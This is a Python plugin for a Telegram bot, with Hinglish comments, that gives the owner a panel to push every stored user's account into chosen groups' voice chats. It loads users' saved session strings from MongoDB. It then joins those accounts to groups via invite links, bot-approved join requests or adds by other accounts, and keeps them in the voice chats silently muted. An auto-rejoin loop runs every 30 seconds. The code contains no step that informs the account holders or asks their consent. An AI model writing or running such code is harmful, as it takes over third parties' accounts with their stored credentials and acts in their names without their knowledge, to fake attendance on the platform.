# plugins/vc_joiner.py
"""
VC Joiner — Owner Panel
Silently joins every stored user (MongoDB session strings) to target VCs.
No separate login. Uses vcfyt_bot's existing session_manager + db.
"""
import asyncio
import inspect
import json
import logging
import os
from html import escape as _h
from typing import Optional

from pyrogram import Client, filters
from pyrogram.types import (
    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message,
)

from pyrogram import errors as _tg_errors

from config import Config
from plugins.ui import HAS_USER
from helpers.vc_manager import session_manager
from helpers.peer_guard import _chat_reference, _resolve, is_peer_error

logger = logging.getLogger("vcbot.vc_joiner")

# ---------------------------------------------------------------
# STATE  (small JSON in home dir — survives restarts)
# ---------------------------------------------------------------
_STATE_FILE = os.path.expanduser("~/.vcj_state.json")
_state = {"targets": [], "auto": "0"}
_joined: dict = {}
_auto_task: Optional[asyncio.Task] = None
_lock = asyncio.Lock()
_join_sem = asyncio.Semaphore(2)
_client_sem = asyncio.Semaphore(3)
_MAX_JOIN = int(os.environ.get('VCJ_MAX_JOIN', '10'))
_silence_path: Optional[str] = None


def _load_state() -> None:
    global _state
    try:
        if os.path.exists(_STATE_FILE):
            with open(_STATE_FILE, "r", encoding="utf-8") as f:
                _state = json.load(f)
    except Exception:
        pass
    _state.setdefault("targets", [])
    _state.setdefault("auto", "0")


_STATE_DB_KEY = "vcj_state"
_state_db_loaded = False


def _save_state() -> None:
    try:
        tmp = _STATE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(_state, f)
        os.replace(tmp, _STATE_FILE)
    except Exception as exc:
        logger.warning("vcj state save failed: %r", exc)
    # Heroku restart par home dir mit jaata hai -> DB me bhi rakho.
    try:
        from helpers.database import db
        asyncio.get_running_loop().create_task(
            db.set_app_value(_STATE_DB_KEY, json.dumps(_state)))
    except Exception:
        pass


async def _ensure_state_loaded() -> None:
    """Targets DB se merge karo (ek hi baar)."""
    global _state_db_loaded
    if _state_db_loaded:
        return
    _state_db_loaded = True
    try:
        from helpers.database import db
        raw = await db.get_app_value(_STATE_DB_KEY)
        saved = json.loads(raw) if raw else {}
    except Exception:
        return
    have = {t.get("chat_id") for t in _state["targets"]}
    for t in saved.get("targets", []) or []:
        if t.get("chat_id") not in have:
            _state["targets"].append(t)
    if saved.get("auto") == "1":
        _state["auto"] = "1"


_load_state()


# ---------------------------------------------------------------
# OWNER CHECK
# ---------------------------------------------------------------
def is_owner(uid: int) -> bool:
    ids = set()
    try:
        for attr in ("OWNER_IDS", "OWNER_ID"):
            v = getattr(Config, attr, None)
            if v is not None:
                if isinstance(v, (list, tuple, set)):
                    ids.update(int(x) for x in v)
                else:
                    ids.add(int(v))
        env = os.environ.get("OWNER_IDS", "")
        if env:
            ids.update(int(x) for x in env.split(",") if x.strip())
    except Exception:
        pass
    return uid in ids


# ---------------------------------------------------------------
# SILENCE FILE  (fallback when play(None) not supported)
# ---------------------------------------------------------------
def _silence_file() -> str:
    global _silence_path
    if _silence_path and os.path.exists(_silence_path):
        return _silence_path
    import subprocess, tempfile
    p = os.path.join(tempfile.gettempdir(), "vcj_silence.ogg")
    if not os.path.exists(p):
        try:
            subprocess.run(
                ["ffmpeg", "-hide_banner", "-loglevel", "error", "-nostdin",
                 "-y", "-f", "lavfi", "-i", "anullsrc=r=48000:cl=stereo",
                 "-t", "5", "-c:a", "libopus", "-b:a", "8k", p],
                check=True, timeout=30, capture_output=True,
            )
        except Exception as exc:
            logger.warning("silence build failed: %r", exc)
            return ""
    _silence_path = p
    return p


# ---------------------------------------------------------------
# LOAD USERS  (lazy — pulls every DB user's session via session_manager)
# ---------------------------------------------------------------
async def _all_user_ids() -> list:
    try:
        from helpers.database import db
        rows = await db.all_users()
        return [int(r["user_id"]) for r in rows if r.get("string_session")]
    except Exception:
        return []


async def _all_uvcs() -> list:
    ids = await _all_user_ids()
    for uid in list(session_manager.users):
        if uid not in ids:
            ids.append(uid)
    out = []
    for uid in ids:
        uvc = session_manager.users.get(uid)
        if uvc is None:
            try:
                uvc = await session_manager.get(uid)   # lazy-load from Mongo
            except Exception as exc:
                logger.debug("lazy load %s failed: %r", uid, exc)
                uvc = None
        if uvc:
            out.append(uvc)
    return out


# ---------------------------------------------------------------
# MEMBERSHIP  (root fix: naye accounts pehle GROUP join karenge, phir VC)
#
# Pehle seedha calls.play() hota tha.  Jo account group ka member nahi
# tha uska play() CHANNEL_INVALID / PEER_ID_INVALID se fail ho jaata
# tha -> sirf group me pehle se added accounts hi VC me aate the.
# Ab har account:  member check -> username / invite link se join ->
# join-request ho to bot approve kare -> last resort koi member account
# usko add kare -> member verify -> tab VC join.
# ---------------------------------------------------------------
def _err(name: str):
    return getattr(_tg_errors, name, type(name, (Exception,), {}))


FloodWait = _err("FloodWait")
UserNotParticipant = _err("UserNotParticipant")
UserAlreadyParticipant = _err("UserAlreadyParticipant")
InviteRequestSent = _err("InviteRequestSent")
InviteHashExpired = _err("InviteHashExpired")
InviteHashInvalid = _err("InviteHashInvalid")
UserBannedInChannel = _err("UserBannedInChannel")
UserChannelsTooMuch = _err("UserChannelsTooMuch")
ChannelsTooMuch = _err("ChannelsTooMuch")
UsersTooMuch = _err("UsersTooMuch")

_FAIL_BACKOFF = float(os.environ.get("VCJ_FAIL_BACKOFF", "600"))
_failed_at: dict = {}       # (uid, chat_id) -> monotonic time of last failure
_last_reason: dict = {}     # (uid, chat_id) -> short reason text
_member_refs: dict = {}     # chat_id -> refs fetched via member accounts (per run)

REASON_TEXT = {
    "no_session": "session load nahi hua",
    "no_link": "group link nahi mila (bot ko admin banao)",
    "link_dead": "invite link expire/invalid",
    "banned": "account group se banned",
    "too_many": "account 500 groups limit par",
    "group_full": "group full",
    "request_pending": "join request pending (bot admin nahi)",
    "not_member": "group join nahi ho paya",
    "vc_off": "VC band hai / join fail",
    "limit": "VCJ_MAX_JOIN limit",
}


def _status_name(member) -> str:
    st = getattr(member, "status", None)
    return str(getattr(st, "name", st) or "").upper()


async def _is_member(client, chat_id: int) -> bool:
    for _ in range(2):
        try:
            m = await client.get_chat_member(chat_id, "me")
        except UserNotParticipant:
            return False
        except FloodWait as exc:
            await asyncio.sleep(min(30, int(getattr(exc, "value", 5)) + 1))
            continue
        except Exception:
            return False
        name = _status_name(m)
        if name in ("LEFT", "BANNED"):
            return False
        if name == "RESTRICTED" and getattr(m, "is_member", True) is False:
            return False
        return True
    return False


async def _target_ref(bot, target: dict, refresh: bool = False) -> Optional[str]:
    """Group ka username / invite link (bot se). Target me cache hota hai."""
    if target is None:
        return None
    if not refresh and target.get("ref"):
        return target["ref"]
    ref = await _chat_reference(bot, target["chat_id"]) if bot else None
    if ref and ref != target.get("ref"):
        target["ref"] = ref
        _save_state()
    return ref or target.get("ref")


async def _approve_request(bot, chat_id: int, user_id: int) -> bool:
    if bot is None or not user_id:
        return False
    try:
        await bot.approve_chat_join_request(chat_id, user_id)
        return True
    except Exception as exc:
        logger.warning("approve join request %s -> %s failed: %r", user_id, chat_id, exc)
        return False


async def _try_join_ref(uvc, chat_id: int, ref: str, bot) -> str:
    """Return 'ok' or a reason code."""
    client = uvc.client
    for attempt in range(2):
        try:
            await client.join_chat(ref)
            return "ok"
        except UserAlreadyParticipant:
            return "ok"
        except InviteRequestSent:
            if await _approve_request(bot, chat_id, uvc.account_id):
                await asyncio.sleep(1.5)
                return "ok"
            return "request_pending"
        except FloodWait as exc:
            wait = int(getattr(exc, "value", 5))
            if attempt or wait > 60:
                return "not_member"
            await asyncio.sleep(wait + 1)
        except (InviteHashExpired, InviteHashInvalid):
            return "link_dead"
        except UserBannedInChannel:
            return "banned"
        except (UserChannelsTooMuch, ChannelsTooMuch):
            return "too_many"
        except UsersTooMuch:
            return "group_full"
        except Exception as exc:
            text = str(exc).upper()
            if "INVITE_REQUEST_SENT" in text:
                if await _approve_request(bot, chat_id, uvc.account_id):
                    await asyncio.sleep(1.5)
                    return "ok"
                return "request_pending"
            if "CHANNELS_TOO_MUCH" in text:
                return "too_many"
            if "BANNED" in text:
                return "banned"
            if "INVITE_HASH" in text:
                return "link_dead"
            logger.warning("join_chat %s -> %s failed: %r", uvc.owner_id, ref, exc)
            return "not_member"
    return "not_member"


async def _add_by_member(inviters, chat_id: int, uvc) -> bool:
    """Koi member account is account ko group me add kare (no admin needed
    agar group members ko add karne deta hai)."""
    who = ("@" + uvc.account_username) if getattr(uvc, "account_username", "") else uvc.account_id
    for inviter in list(inviters or [])[:3]:
        if inviter is None or inviter is uvc.client:
            continue
        try:
            await inviter.add_chat_members(chat_id, who)
            return True
        except UserAlreadyParticipant:
            return True
        except Exception as exc:
            logger.debug("add_chat_members via inviter failed: %r", exc)
    return False


async def _ensure_member(uvc, chat_id: int, bot=None, target: dict = None,
                         inviters=None) -> str:
    """Account ko group ka member banao. Return 'ok' or reason code."""
    client = getattr(uvc, "client", None)
    if client is None:
        return "no_session"
    if await _is_member(client, chat_id):
        await _resolve(client, chat_id)
        return "ok"

    reason = "no_link"
    refs = []
    ref = await _target_ref(bot, target)
    if ref:
        refs.append(ref)
    if chat_id not in _member_refs:          # ek run me sirf ek baar
        found = []
        for inviter in list(inviters or [])[:2]:
            r = await _chat_reference(inviter, chat_id)
            if r and r not in found:
                found.append(r)
        _member_refs[chat_id] = found
    for r in _member_refs.get(chat_id, []):
        if r not in refs:
            refs.append(r)

    tried_refresh = False
    i = 0
    while i < len(refs):
        r = refs[i]
        i += 1
        reason = await _try_join_ref(uvc, chat_id, r, bot)
        if reason == "link_dead" and not tried_refresh:
            tried_refresh = True
            fresh = await _target_ref(bot, target, refresh=True)
            if fresh and fresh not in refs:
                refs.append(fresh)
            continue
        if reason == "ok":
            await asyncio.sleep(1.0)
            if await _is_member(client, chat_id):
                await _resolve(client, chat_id)
                return "ok"
            reason = "not_member"
        if reason in ("banned", "too_many", "group_full"):
            return reason

    if await _add_by_member(inviters, chat_id, uvc):
        await asyncio.sleep(1.5)
        if await _is_member(client, chat_id):
            await _resolve(client, chat_id)
            return "ok"
        reason = "not_member"
    return reason


async def _in_call(uvc, chat_id: int) -> bool:
    try:
        active = getattr(uvc.calls, "calls", None)
        if inspect.isawaitable(active):
            active = await active
        return bool(active) and chat_id in active
    except Exception:
        return False


# ---------------------------------------------------------------
# JOIN / LEAVE
# ---------------------------------------------------------------
async def _play_silent(uvc, chat_id: int) -> None:
    # 1) Try play(None) - some pytgcalls builds accept it
    try:
        await uvc.calls.play(chat_id, None)
        try:
            await uvc.calls.mute(chat_id)
        except Exception:
            pass
        logger.info("Joined %s -> %s (None)", uvc.owner_id, chat_id)
        return
    except Exception as e1:
        if is_peer_error(e1):
            raise
        logger.debug("play(None) failed: %r", e1)

    # 2) Fallback: silent SHELL stream - no ffprobe needed
    from ntgcalls import MediaSource
    from pytgcalls.types.raw import AudioParameters, AudioStream, Stream
    try:
        from pytgcalls.types import GroupCallConfig
    except ImportError:
        GroupCallConfig = None

    cmd = (
        "ffmpeg -hide_banner -loglevel error -nostdin -re -threads 1 "
        "-f lavfi -i anullsrc=r=48000:cl=stereo "
        "-f s16le -ar 48000 -ac 2 pipe:1"
    )
    audio = AudioStream(MediaSource.SHELL, cmd, AudioParameters(48000, 2))
    stream = Stream(microphone=audio)
    try:
        if GroupCallConfig is not None:
            await uvc.calls.play(chat_id, stream, GroupCallConfig(auto_start=False))
        else:
            await uvc.calls.play(chat_id, stream)
    except Exception as exc:
        if is_peer_error(exc):
            raise
        await uvc.calls.play(chat_id, stream)
    try:
        await uvc.calls.mute(chat_id)
    except Exception:
        pass
    logger.info("Joined %s -> %s (silent shell)", uvc.owner_id, chat_id)


async def _join_one(uvc, chat_id: int, bot=None, target: dict = None,
                    inviters=None) -> bool:
    if not getattr(uvc, "calls", None):
        _last_reason[(getattr(uvc, "owner_id", 0), chat_id)] = "no_session"
        return False
    key = (uvc.owner_id, chat_id)
    reason = await _ensure_member(uvc, chat_id, bot=bot, target=target,
                                  inviters=inviters)
    if reason != "ok":
        _last_reason[key] = reason
        logger.warning("vcj: %s not member of %s (%s)", uvc.owner_id, chat_id, reason)
        return False
    for attempt in range(2):
        try:
            await _play_silent(uvc, chat_id)
            _joined[key] = True
            _failed_at.pop(key, None)
            _last_reason.pop(key, None)
            if inviters is not None and uvc.client not in inviters:
                inviters.append(uvc.client)
            return True
        except Exception as exc:
            if attempt == 0 and is_peer_error(exc):
                await _resolve(uvc.client, chat_id)
                await asyncio.sleep(1.0)
                continue
            logger.warning("join %s -> %s failed: %r",
                           getattr(uvc, "owner_id", "?"), chat_id, exc)
            break
    _last_reason[key] = "vc_off"
    return False


async def _leave_one(uvc, chat_id: int) -> None:
    try:
        if getattr(uvc, "calls", None):
            await uvc.calls.leave_call(chat_id)
    except Exception:
        pass
    _joined.pop((uvc.owner_id, chat_id), None)


def _find_target(chat_id: int) -> dict:
    for t in _state["targets"]:
        if t.get("chat_id") == chat_id:
            return t
    return {"chat_id": chat_id, "title": str(chat_id)}


async def _seed_inviters(chat_id: int) -> list:
    """Already-loaded accounts jo group ke member hain (add fallback ke liye)."""
    out = []
    for (uid, cid) in list(_joined):
        if cid == chat_id:
            uvc = session_manager.users.get(uid)
            if uvc and uvc.client and uvc.client not in out:
                out.append(uvc.client)
    owner = Config.primary_owner() if hasattr(Config, "primary_owner") else None
    try:
        uvc = session_manager.users.get(int(owner)) if owner else None
    except Exception:
        uvc = None
    if uvc and uvc.client and uvc.client not in out:
        if await _is_member(uvc.client, chat_id):
            out.append(uvc.client)
    return out


async def _join_all_target(chat_id: int, bot=None, only_new: bool = False) -> dict:
    async with _lock:
        res = {"joined": 0, "failed": 0, "skipped": 0, "total": 0,
               "limit": 0, "reasons": {}}
        target = _find_target(chat_id)
        _member_refs.pop(chat_id, None)
        uids = await _all_user_ids()
        for uid in list(session_manager.users):
            if uid not in uids:
                uids.append(uid)
        res["total"] = len(uids)
        if bot is not None:
            await _target_ref(bot, target)
        inviters = await _seed_inviters(chat_id)
        joined_count = 0
        now = asyncio.get_running_loop().time()
        for uid in uids:
            key = (uid, chat_id)
            uvc = session_manager.users.get(uid)
            if key in _joined and uvc is not None and await _in_call(uvc, chat_id):
                res["skipped"] += 1
                continue
            _joined.pop(key, None)
            if only_new and now - _failed_at.get(key, -1e9) < _FAIL_BACKOFF:
                continue
            if _MAX_JOIN > 0 and joined_count >= _MAX_JOIN:
                res["limit"] += 1
                continue
            if uvc is None:
                async with _client_sem:
                    try:
                        uvc = await session_manager.get(uid)
                    except Exception as exc:
                        logger.debug("lazy load %s failed: %r", uid, exc)
                        uvc = None
            if uvc is None:
                res["failed"] += 1
                res["reasons"]["no_session"] = res["reasons"].get("no_session", 0) + 1
                _failed_at[key] = asyncio.get_running_loop().time()
                continue
            async with _join_sem:
                ok = await _join_one(uvc, chat_id, bot=bot, target=target,
                                     inviters=inviters)
            if ok:
                res["joined"] += 1
                joined_count += 1
            else:
                res["failed"] += 1
                r = _last_reason.get(key, "vc_off")
                res["reasons"][r] = res["reasons"].get(r, 0) + 1
                _failed_at[key] = asyncio.get_running_loop().time()
            await asyncio.sleep(2.0)  # rate limit
        if res["limit"]:
            logger.warning("VCJ_MAX_JOIN=%s reached, %s users baaki", _MAX_JOIN, res["limit"])
        return res


def _reason_lines(reasons: dict) -> str:
    if not reasons:
        return ""
    return "\n".join(f"   • {REASON_TEXT.get(k, k)}: <code>{v}</code>"
                     for k, v in sorted(reasons.items(), key=lambda kv: -kv[1]))


async def _leave_all_target(chat_id: int) -> dict:
    async with _lock:
        res = {"left": 0}
        for uid, cid in list(_joined.keys()):
            if cid != chat_id:
                continue
            uvc = session_manager.users.get(uid)
            if uvc is None:
                _joined.pop((uid, cid), None)
                continue
            await _leave_one(uvc, cid)
            res["left"] += 1
            await asyncio.sleep(1.0)
        return res


# ---------------------------------------------------------------
# AUTO-REJOIN LOOP
# ---------------------------------------------------------------
async def _auto_loop(client: Client) -> None:
    while True:
        try:
            await _ensure_state_loaded()
            if _state.get("auto") == "1" and _state["targets"]:
                for t in list(_state["targets"]):
                    # dropped + naye logged-in users dono ko join karao
                    await _join_all_target(t["chat_id"], bot=client, only_new=True)
        except asyncio.CancelledError:
            return
        except Exception as exc:
            logger.debug("auto loop err: %r", exc)
        await asyncio.sleep(30)


def _ensure_auto(client: Client) -> None:
    global _auto_task
    if _auto_task and not _auto_task.done():
        return
    try:
        _auto_task = asyncio.get_event_loop().create_task(_auto_loop(client))
    except RuntimeError:
        pass


# ---------------------------------------------------------------
# UI
# ---------------------------------------------------------------
def _menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("▶️ Join All", callback_data="vcj:join_all"),
         InlineKeyboardButton("⏹️ Leave All", callback_data="vcj:leave_all")],
        [InlineKeyboardButton("📋 Targets", callback_data="vcj:list"),
         InlineKeyboardButton("➕ Add Target", callback_data="vcj:add_hint")],
        [InlineKeyboardButton("👥 Users", callback_data="vcj:users"),
         InlineKeyboardButton("🔗 Joined", callback_data="vcj:joined")],
        [InlineKeyboardButton("🔄 Auto-Rejoin", callback_data="vcj:auto"),
         InlineKeyboardButton("♻️ Refresh", callback_data="vcj:refresh")],
        [InlineKeyboardButton("✖️ Close", callback_data="vcj:close")],
    ])


def _text() -> str:
    n_users = len(session_manager.users)
    auto = "🟢 ON" if _state.get("auto") == "1" else "⚪ OFF"
    return (
        "╭─「 🎛️ <b>VC JOINER</b> 」\n"
        f"│ 🎯 Targets: <code>{len(_state['targets'])}</code>\n"
        f"│ 👥 Users:   <code>{n_users}</code>\n"
        f"│ 🔗 Joined:  <code>{len(_joined)}</code>\n"
        f"│ ♻️ Auto:    {auto}\n"
        "│\n"
        "│ Har stored user target VC me\n"
        "│ <b>silently muted</b> join hoga.\n"
        "╰────────────────"
    )


# ---------------------------------------------------------------
# COMMANDS
# ---------------------------------------------------------------
@Client.on_message(HAS_USER & filters.text & filters.regex(r"^[./!]vcjoin(?:@\w+)?\b", flags=2) & (filters.group | filters.private))
async def _cmd_vcjoin(client: Client, msg: Message):
    if not is_owner(msg.from_user.id):
        return
    await _ensure_state_loaded()
    _ensure_auto(client)
    await msg.reply_text(_text(), reply_markup=_menu())


@Client.on_message(HAS_USER & filters.text & filters.regex(r"^[./!]setvc(?:@\w+)?\b", flags=2) & filters.group)
async def _cmd_setvc(client: Client, msg: Message):
    if not is_owner(msg.from_user.id):
        return
    await _ensure_state_loaded()
    cid = msg.chat.id
    title = msg.chat.title or str(cid)
    target = None
    for t in _state["targets"]:
        if t["chat_id"] == cid:
            target = t
    added = target is None
    if added:
        target = {"chat_id": cid, "title": title}
        _state["targets"].append(target)
    target["title"] = title
    # Naye accounts isi link/username se group join karenge.
    ref = await _target_ref(client, target, refresh=True)
    _save_state()
    head = (f"✅ Target added:\n<code>{cid}</code> — {_h(title)}" if added
            else f"ℹ️ Already target: <b>{_h(title)}</b> (link refresh ho gaya)")
    if ref:
        note = "🔗 Join link ready — jo accounts group me nahi hain wo khud join karenge."
    else:
        note = ("⚠️ Group link nahi mila. Bot ko is group me <b>admin</b> banao "
                "(<i>Invite users</i> permission) ya group public karo, warna sirf "
                "pehle se added accounts hi VC join karenge.")
    await msg.reply_text(
        f"{head}\n\n{note}\n\nAb <code>/vcjoin</code> se <b>Join All</b> chala do."
    )


@Client.on_message(HAS_USER & filters.text & filters.regex(r"^[./!]setvc(?:@\w+)?\b", flags=2) & filters.private)
async def _cmd_setvc_dm(client: Client, msg: Message):
    if not is_owner(msg.from_user.id):
        return
    await msg.reply_text("ℹ️ <code>.setvc</code> target group ke andar bhejein — "
                         "wahi group VC Joiner ka target ban jayega.")


@Client.on_message(HAS_USER & filters.text & filters.regex(r"^[./!]delvc(?:@\w+)?\b", flags=2) & (filters.group | filters.private))
async def _cmd_delvc(client: Client, msg: Message):
    if not is_owner(msg.from_user.id):
        return
    parts = (msg.text or "").split(maxsplit=1)
    if len(parts) < 2:
        await msg.reply_text("Usage: <code>/delvc -1001234567890</code>")
        return
    try:
        cid = int(parts[1].strip())
    except ValueError:
        await msg.reply_text("Invalid chat id")
        return
    before = len(_state["targets"])
    _state["targets"][:] = [t for t in _state["targets"] if t["chat_id"] != cid]
    if len(_state["targets"]) == before:
        await msg.reply_text("Not found")
        return
    _save_state()
    await msg.reply_text(f"🗑️ Removed <code>{cid}</code>")


# ---------------------------------------------------------------
# CALLBACKS
# ---------------------------------------------------------------
@Client.on_callback_query(filters.regex(r"^vcj:"))
async def _cb_vcj(client: Client, cq: CallbackQuery):
    if not is_owner(cq.from_user.id):
        await cq.answer("Owner only!", show_alert=True)
        return
    await _ensure_state_loaded()
    _ensure_auto(client)
    action = (cq.data or "").split(":", 1)[-1]

    if action == "close":
        try:
            await cq.message.delete()
        except Exception:
            pass
        return

    if action == "refresh":
        await cq.answer("Refreshed")
        try:
            await cq.message.edit_text(_text(), reply_markup=_menu())
        except Exception:
            pass
        return

    if action == "add_hint":
        await cq.answer(
            "Group ke VC me jaake /setvc chalao — wahi target banega.",
            show_alert=True,
        )
        return

    if action == "list":
        if not _state["targets"]:
            await cq.answer("Koi target nahi", show_alert=True)
            return
        body = "<b>🎯 Targets:</b>\n" + "\n".join(
            f"<code>{i}.</code> {_h(t['title'])} — <code>{t['chat_id']}</code>"
            for i, t in enumerate(_state["targets"], 1)
        )
        await cq.message.edit_text(body, reply_markup=_menu())
        await cq.answer()
        return

    if action == "users":
        uids = await _all_user_ids()
        if not uids:
            await cq.answer("Koi user stored nahi", show_alert=True)
            return
        lines = ["<b>👥 Stored users:</b>\n"]
        for uid in uids[:30]:
            uvc = session_manager.users.get(uid)
            nm = getattr(uvc, "account_name", "") if uvc else ""
            lines.append(f"• <code>{uid}</code> {_h(str(nm or ''))}".rstrip())
        if len(uids) > 30:
            lines.append(f"<i>+{len(uids)-30} aur...</i>")
        await cq.message.edit_text("\n".join(lines), reply_markup=_menu())
        await cq.answer()
        return

    if action == "joined":
        if not _joined:
            await cq.answer("Koi active join nahi", show_alert=True)
            return
        body = "<b>🔗 Active joins:</b>\n" + "\n".join(
            f"• <code>{uid}</code> → <code>{cid}</code>" for (uid, cid) in list(_joined)[:40]
        )
        await cq.message.edit_text(body, reply_markup=_menu())
        await cq.answer()
        return

    if action == "join_all":
        if not _state["targets"]:
            await cq.answer("Pehle target add karo", show_alert=True)
            return
        await cq.answer("Joining...")
        msg = await cq.message.edit_text("⏳ Joining all stored users...")
        T = {"joined": 0, "failed": 0, "skipped": 0, "limit": 0}
        reasons: dict = {}
        for t in list(_state["targets"]):
            r = await _join_all_target(t["chat_id"], bot=client)
            for k in T:
                T[k] += r.get(k, 0)
            for k, v in r.get("reasons", {}).items():
                reasons[k] = reasons.get(k, 0) + v
            try:
                await msg.edit_text(
                    f"⏳ <b>{_h(t['title'])}</b>\n"
                    f"✅ {r['joined']}  ❌ {r['failed']}  ⏭️ {r['skipped']}"
                )
            except Exception:
                pass
        extra = ""
        if reasons:
            extra += "\n<b>Fail kyun:</b>\n" + _reason_lines(reasons)
        if T["limit"]:
            extra += (f"\n⏸️ Limit (<code>VCJ_MAX_JOIN={_MAX_JOIN}</code>): "
                      f"<code>{T['limit']}</code> baaki — dobara Join All dabao.")
        await msg.edit_text(
            f"✅ <b>Done</b>\n"
            f"Joined: <code>{T['joined']}</code>\n"
            f"Failed: <code>{T['failed']}</code>\n"
            f"Skipped (already in VC): <code>{T['skipped']}</code>" + extra,
            reply_markup=_menu(),
        )
        return

    if action == "leave_all":
        if not _state["targets"]:
            await cq.answer("Kuch nahi", show_alert=True)
            return
        await cq.answer("Leaving...")
        msg = await cq.message.edit_text("⏳ Leaving...")
        total = 0
        for t in _state["targets"]:
            r = await _leave_all_target(t["chat_id"])
            total += r["left"]
        await msg.edit_text(
            f"⏹️ Done — <code>{total}</code> joins cleared.", reply_markup=_menu(),
        )
        return

    if action == "auto":
        _state["auto"] = "0" if _state.get("auto") == "1" else "1"
        _save_state()
        await cq.answer(
            "Auto-rejoin ON 🟢" if _state["auto"] == "1"
            else "Auto-rejoin OFF ⚪"
        )
        await cq.message.edit_text(_text(), reply_markup=_menu())
        return

    await cq.answer()
